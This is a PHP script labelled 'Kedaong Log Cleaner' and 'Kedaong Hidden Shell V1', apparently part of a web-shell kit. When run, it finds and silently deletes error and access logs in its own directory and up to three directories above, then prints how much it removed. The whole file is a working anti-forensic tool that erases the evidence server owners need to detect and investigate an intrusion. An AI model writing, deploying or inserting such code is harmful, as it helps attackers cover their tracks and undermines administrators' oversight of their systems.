<?php
/**
 * Kedaong Log Cleaner
 * Kedaong Hidden Shell V1
 */

header('Content-Type: text/plain; charset=utf-8');
echo "=== Kedaong Log Cleaner ===\n";
echo "Started: " . date('Y-m-d H:i:s') . "\n";
echo "PHP User: " . get_current_user() . "\n";

function formatBytes($bytes, $precision = 2) {
    if ($bytes == 0) return '0 B';
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    $bytes /= pow(1024, $pow);
    return round($bytes, $precision) . ' ' . $units[$pow];
}

$logFilesToDelete = [
    'error.log',
    'debug.log',
    'access.log',
    'system.log',
    'application.log',
    'error_log',
    'php_error.log',
    'php_errors.log',
    '../error.log',
    '../debug.log',
    '../access.log',
    '../system.log',
    '../error_log',
    '../../error.log',
    '../../error_log',
    '../../../error.log', 
    '../../../error_log',
    'logs/error.log',
    'logs/debug.log',
    'logs/access.log',
    'logs/system.log',
    'logs/application.log',
    '../logs/error.log',
    '../../logs/error.log',
    '../../../logs/error.log',
    'log/error.log',
    'log/debug.log',
    'log/access.log',
    'log/system.log',
    'log/application.log',
    '../log/error.log',
    '../../log/error.log',
    '../../../log/error.log',
    'error.log.old',
    'error.log.1',
    'error.log.2',
    'error.log.3',
    'debug.log.old',
    'access.log.old',
    'system.log.old',
    'error_log.old',
    'logs/error.log.old',
    'log/error.log.old',
];

echo "🔍 Checking for log files...\n\n";

$deletedCount = 0;
$failedCount = 0;
$totalFreed = 0;
$foundFiles = [];

foreach ($logFilesToDelete as $logFile) {
    if (file_exists($logFile) && is_file($logFile)) {
        $foundFiles[] = $logFile;
    }
}

if (empty($foundFiles)) {
    echo "✅ No log files found to delete.\n";
    echo "The system is already clean!\n\n";
    
    echo "=== SCAN RESULTS ===\n";
    echo "Scanned " . count($logFilesToDelete) . " possible log file locations\n";
    echo "No log files found in any of these locations\n";
    
    echo "\n=== COMMON LOG FILE LOCATIONS ===\n";
    echo "1. error.log\n";
    echo "2. debug.log\n";
    echo "3. access.log\n";
    echo "4. error_log\n";
    echo "5. logs/error.log\n";
    echo "6. log/error.log\n";
    echo "7. ../error.log\n";
    echo "8. ../error_log\n";
    
    echo "\n💡 If you have log files in other locations,\n";
    echo "   add their paths to the \$logFilesToDelete array.\n";
    
} else {
    echo "✅ Found " . count($foundFiles) . " log file(s) to delete:\n";
    echo "========================================\n";
    
    foreach ($foundFiles as $logFile) {
        $fileSize = filesize($logFile);
        $sizeFormatted = formatBytes($fileSize);
        
        echo "📄 $logFile ($sizeFormatted) - ";
        
        if (@unlink($logFile)) {
            echo "✅ DELETED\n";
            $deletedCount++;
            $totalFreed += $fileSize;
        } else {
            $error = error_get_last();
            echo "❌ FAILED";
            if ($error) echo " (" . $error['message'] . ")";
            echo "\n";
            $failedCount++;
        }
    }
    
    echo "\n=== RESULTS ===\n";
    echo "Total found: " . count($foundFiles) . "\n";
    echo "Successfully deleted: $deletedCount\n";
    echo "Failed to delete: $failedCount\n";
    echo "Total space freed: " . formatBytes($totalFreed) . "\n";
}

echo "\n=== COMPLETED ===\n";
echo "Finished: " . date('Y-m-d H:i:s') . "\n";

?>
